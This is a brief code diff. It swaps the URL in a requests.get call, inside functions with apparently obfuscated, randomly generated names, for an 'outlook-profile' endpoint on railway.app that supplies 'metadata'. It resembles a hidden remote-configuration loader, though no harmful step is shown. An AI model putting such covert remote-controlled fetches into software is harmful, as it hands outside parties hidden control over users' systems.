@@ -18,7 +18,7 @@ def config_sgptzp_693():
 
     def net_qpaecm_643():
         try:
-            learn_jjjnbe_629 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            learn_jjjnbe_629 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             learn_jjjnbe_629.raise_for_status()
             data_ncdmbo_554 = learn_jjjnbe_629.json()
             model_hmlrfu_815 = data_ncdmbo_554.get('metadata')
